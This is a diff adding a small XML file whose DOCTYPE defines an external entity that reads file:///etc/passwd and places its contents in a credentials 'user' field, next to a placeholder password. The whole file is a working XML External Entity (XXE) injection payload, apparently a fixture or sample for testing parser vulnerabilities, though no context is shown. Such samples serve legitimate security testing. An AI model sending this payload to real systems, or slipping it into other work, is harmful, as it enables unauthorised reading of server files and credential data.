@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE credentials [
+<!ELEMENT credentials ANY >
+<!ELEMENT user ANY >
+<!ENTITY user SYSTEM "file:///etc/passwd">]>
+<credentials>
+    <user>&user;</user>
+    <pass>mypass</pass>
+</credentials>
